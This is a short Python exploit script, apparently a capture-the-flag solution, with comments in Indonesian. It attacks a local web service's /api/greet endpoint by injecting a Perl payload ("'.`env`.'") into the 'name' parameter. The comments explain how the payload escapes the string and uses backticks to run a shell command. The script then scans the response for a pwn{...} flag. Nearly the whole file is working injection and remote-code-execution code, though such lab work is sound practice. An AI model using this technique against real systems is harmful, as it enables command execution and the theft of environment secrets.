import requests
import re

# Perhatikan Endpoint-nya: /api/greet
URL = "http://localhost:1337/api/greet"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload Perl Injection
    # 1. '      -> Tutup string awal ('Hello ')
    # 2. .      -> Operator sambung string (Concatenation)
    # 3. `env`  -> Backticks buat eksekusi shell command (RCE)
    # 4. .      -> Sambung lagi
    # 5. '      -> Buka string penutup biar syntax valid
    payload = "'.`env`.'"
    
    print(f"[*] Sending Payload: {payload}")
    
    try:
        # Kirim ke parameter 'name'
        r = requests.get(URL, params={'name': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Responsenya JSON {"message": "..."}
            # Kita cari pattern flag
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed. Raw output:")
                print(r.text[:500]) 
        else:
            print(f"[-] Error Status: {r.status_code}")
            print(r.text)
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()
